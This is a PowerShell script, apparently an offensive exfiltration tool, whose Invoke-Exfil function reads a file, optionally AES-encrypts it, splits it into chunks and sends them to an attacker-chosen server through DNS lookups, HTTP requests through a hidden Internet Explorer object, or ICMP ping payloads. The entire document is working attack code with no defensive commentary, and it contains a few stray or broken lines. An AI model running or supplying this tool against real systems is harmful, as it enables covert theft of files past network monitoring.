function Send-HTTPRequest {
    param ([string] $data, [System.__ComObject] $IE)
    $url = "http://" + $server + ":" + $port + "/";
    $data = Base64 $data;
    $IE.navigate2($url+$data)
    Start-Sleep -s 2;
};

function Send-ICMPPacket {
    param ([string] $data)
    $data = Base64 $data;
    $IPAddress = $server 
    print $server 
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $sendbytes = ([text.encoding]::ASCII).GetBytes($data)
    $ICMPClient.Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null
    Start-Sleep -s 1;;ls
};

function Send-DNSRequest {
    param ([string] $server, [string] $data, [string] $jobid)
    $data = Convert-ToCHexString $data  
    $len = $data.Length;
    $split = 66 - $len.Length - $dns.Length;
    # get the size of the file and split it
    $repeat=[Math]::Floor($len/($split));
    $remainder=$len%$split;
    for($i=0; $i-lt($repeat); $i++){
        $str = $data.Substring($i*$Split,$Split);
        $str = $jobid + $str + '.' + $dns;
        $q = nslookup -querytype=A $str $server;
    };
    if($remainder){
        $str = $data.Substring($len-$remainder);
        $str = $jobid + $str + '.' + $dns;
        $q = nslookup -querytype=A $str $server;
    };
};


function Invoke-Exfil {
    param ([string] $file, [string] $key, [string] $server, [string] $port, [string] $type, [string] $dns)
    $bytes = [System.IO.File]::ReadAllBytes($file)
    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
    $hash = $hash -replace '-','';
    $IE = new-object -com internetexplorer.application;
    $data = [System.IO.File]::ReadAllBytes($file);
    If ($key) {
        $data = AES $data 
    }
    $string = [System.BitConverter]::ToString($data);
    $string = $string -replace '-','';
    $filename = Split-Path $file -leaf
    $len = $string.Length;
    #$split = 300
    If ($type -eq 'dns') {
     $split = 66 - $len.Length - $dns.Length;
    }
    Else {
    $split = Get-Random -minimum 150 -maximum 500;
    }

    $id = 0
    $repeat=[Math]::Ceiling($len/$split);
    $remainder=$len%$split;
    $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
    $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 


    # determine exfil type and send data;
	


    If ($type -eq 'DNS') {
        $q = Send-DNSRequest $server $data $jobid
        for($i=0; $i-lt($repeat-1); $i++){
            $str = $string.Substring($i * $Split, $Split);
            $data = $jobid + '|!|' + $i + '|!|' + $str
            $q = Send-DNSRequest $server $data $jobid
        };
        if($remainder){
            $str = $string.Substring($len-$remainder);
            $i = $i +1
            $data = $jobid + '|!|' + $i + '|!|' + $str
            $q = Send-DNSRequest $server $data $jobid
        };
    
        $i = $i + 1
        $data = $jobid + '|!|' + $i + '|!|DONE'
        $q = Send-DNSRequest $server $data $jobid
       }	


    ElseIf ($type -eq 'HTTP') {
        $q = Send-HTTPRequest $data $IE
        for($i=0; $i-lt$repeat-1; $i++){
            $str = $string.Substring($i * $Split, $Split);
            $data = $jobid + '|!|' + $i + '|!|' + $str
            $q = Send-HTTPRequest $data $IE
        };
        if($remainder){
            $str = $string.Substring($len-$remainder);
            $i = $i +1
            $data = $jobid + '|!|' + $i + '|!|' + $str
            $q = Send-HTTPRequest $data $IE
        };

        $i = $i + 1
        $data = $jobid + '|!|' + $i + '|!|DONE'
        $q = Send-HTTPRequest $data $IE
        }
    
    Elseif ($type -eq 'ICMP') {
        $q = Send-ICMPPacket $data
        for($i=0; $i-lt($repeat-1); $i++){
            $str = $string.Substring($i * $Split, $Split);
            $data = $jobid + '|!|' + $i + '|!|' + $str
            $q = Send-ICMPPacket $data
        };
        if($remainder){
            $str = $string.Substring($len-$remainder);
            $i = $i +1
            $data = $jobid + '|!|' + $i + '|!|' + $str
            $q = Send-ICMPPacket $data
        };
    
        $i = $i + 1
        $data = $jobid + '|!|' + $i + '|!|DONE'
        $q = Send-ICMPPacket $data
        };
       } 

  
function Base64 {
    param ([string] $data)
    $Bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
    return [Convert]::ToBase64String($Bytes)    
}

function AES {
    param ([byte[]] $data)
    $sha256 = New-Object System.Security.Cryptography.SHA256Managed
    $AES = New-Object System.Security.Cryptography.AesManaged
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.BlockSize = 128
    $AES.KeySize = 256
	$AES.Padding = "PKCS7"
    $AES.Key = [Byte[]] $sha256.ComputeHash([Text.Encoding]::ASCII.GetBytes($key))
    $IV = new-object "System.Byte[]" 16
    $RNGCrypto = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $RNGCrypto.GetBytes($IV)
    $AES.IV = $IV

    $Encryptor = $AES.CreateEncryptor()

    return ($IV + $encryptor.TransformFinalBlock($data, 0, $data.Length))
};

function Convert-ToCHexString {
    param ([String] $str) 
    $ans = ''
    [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
    return $ans;
}
